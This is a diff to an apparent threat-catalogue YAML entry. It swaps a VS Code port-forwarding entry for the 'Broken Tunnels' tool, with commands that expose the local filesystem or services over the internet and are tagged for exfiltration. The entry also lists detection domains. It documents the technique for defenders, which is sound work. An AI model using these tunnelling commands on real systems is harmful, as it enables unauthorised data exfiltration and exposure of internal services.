@@ -4,22 +4,21 @@ Description: Broken Tunnels enables insiders as well as threat actors to expose 
 Author: Kamran Saifullah
 Created: 2024-10-05
 Commands:
-  - Command: CTRL + SHIFT + P, Searching for Forward a port. Click on forward the port and provide a local port which is required to be exposed over the internet.
-    Description: This will generate a microsoft tunnel link proxying the traffic to the local binded port.
-    Usecase: Exposing internal application on Microsoft Tunnels over the internet.  
-    Category: Access
-    Privileges: User
-    OperatingSystem: Windows, Mac, Linux
-
-  - Command: CTRL + SHIFT + P, Searching for Foreward a port, Click on forward the port and provide a local port on which a local server is running. An example, 'python -m http.server 8080'.  
-    Description: Insider threat, external threat actor will be able to expose the local system over the internet and exfiltrate the sensitive files.
-    Usecase: Accessing & exfiltrating the local files on VSCode Cloud for Data Exfiltration.
+  - Command: btunnel.exe file --key <API-KEY>
+    Description: This will generate tunnels link while exposing the local filesystem as a Directory Listing.
+    Usecase: Exposing file system over the internet.
     Category: Exfiltrate
     Privileges: User
     OperatingSystem: Windows, Mac, Linux
-
+Commands:
+  - Command: btunnel.exe http --key <API-KEY>
+    Description: This will generate tunnels link binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc. 
+    Usecase: Exposing local services, ports, web applications etc. over the internet.
+    Category: Access
+    Privileges: User
+    OperatingSystem: Windows, Mac, Linux
 Full_Path:
-  - Path: Downloaded version of Visual Studio Code, which gets executed anywhere on the system.
+  - Path: Downloaded version of Btunnels, which gets executed anywhere on the system.
 Detection:
   - Domain: '*.btunnel.co.in'
   - Domain: '*.btunnel.in'
